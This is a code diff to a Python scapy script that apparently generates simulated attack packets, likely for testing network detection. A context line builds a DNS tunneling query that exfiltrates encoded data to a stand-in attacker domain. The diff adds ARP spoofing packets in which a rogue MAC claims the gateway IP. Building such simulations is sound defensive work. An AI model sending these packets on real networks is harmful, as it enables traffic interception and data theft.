@@ -6,7 +6,7 @@ from typing import List
 import scapy.all as scapy
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import IP, TCP, UDP, ICMP
-from scapy.layers.l2 import Ether
+from scapy.layers.l2 import Ether, ARP
 
 
 def generate_scenario_packets() -> List[scapy.Packet]:
@@ -50,6 +50,12 @@ def generate_scenario_packets() -> List[scapy.Packet]:
     print("[*] Generating Anomalous DNS Tunneling query...")
     tunnel_subdomain = "v1-0a4fbc89e31d994e77a2810cd04481bc90aef.exfil-data.tunnel.attacker-domain.xyz"
     packets.append(Ether() / IP(src="192.168.1.105", dst="8.8.8.8") / UDP(sport=54322, dport=53) / DNS(rd=1, qd=DNSQR(qname=tunnel_subdomain)))
+
+    print("[*] Generating ARP Poisoning & Spoofing simulation...")
+    # Legitimate Gateway ARP announcement
+    packets.append(Ether(src="00:11:22:33:44:55", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", hwsrc="00:11:22:33:44:55", psrc="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.1.1"))
+    # Rogue attacker claiming Gateway IP with rogue MAC
+    packets.append(Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", hwsrc="aa:bb:cc:dd:ee:ff", psrc="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.1.50"))
 
     print("[*] Generating ICMP Ping burst...")
     for _ in range(55):
